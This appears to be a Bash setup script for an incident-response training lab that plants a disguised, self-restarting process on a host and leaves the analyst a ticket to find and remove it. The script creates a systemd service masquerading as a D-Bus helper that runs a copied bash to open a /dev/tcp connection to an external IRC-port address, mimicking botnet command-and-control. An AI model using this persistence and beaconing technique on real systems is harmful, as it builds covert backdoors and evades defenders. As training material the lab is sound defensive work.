#!/usr/bin/env bash
# Lab 121: una conexión ESTABLISHED hacia una IP desconocida en el 6667 (IRC,
# clásico de botnets). El proceso se hace pasar por un componente de D-Bus y
# un servicio systemd lo relanza si lo matas.
set -e
mkdir -p /var/tmp/.dbus
cp /bin/bash /var/tmp/.dbus/dbus-sync
chmod 0755 /var/tmp/.dbus/dbus-sync
cat > /etc/systemd/system/dbus-sync.service <<'UNIT'
[Unit]
Description=D-Bus session synchronization helper
After=network-online.target

[Service]
ExecStart=/var/tmp/.dbus/dbus-sync -c 'exec 3<>/dev/tcp/198.51.100.66/6667; echo "NICK web-121" >&3; while sleep 20 3>&-; do echo PING >&3 || exit 1; done'
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload
systemctl enable --now dbus-sync.service nginx
for _ in $(seq 1 20); do ss -tn state established | grep -q '198.51.100.66:6667' && break; sleep 1; done

mkdir -p /home/analista/ticket
cat > /home/analista/ticket/INC-121.txt <<'TXT'
INC-121 · web-121
El firewall perimetral avisa: web-121 mantiene una conexión abierta hacia una
IP que no es nuestra, a un puerto poco habitual. Identifica el proceso (qué
binario, de dónde arranca), córtalo de forma que no vuelva, bloquea la IP en
salida y documenta en ~/conexion.txt (IP, puerto, PID, binario, unidad).
TXT
chown -R analista:analista /home/analista/ticket
echo "Lab 121 plantado."
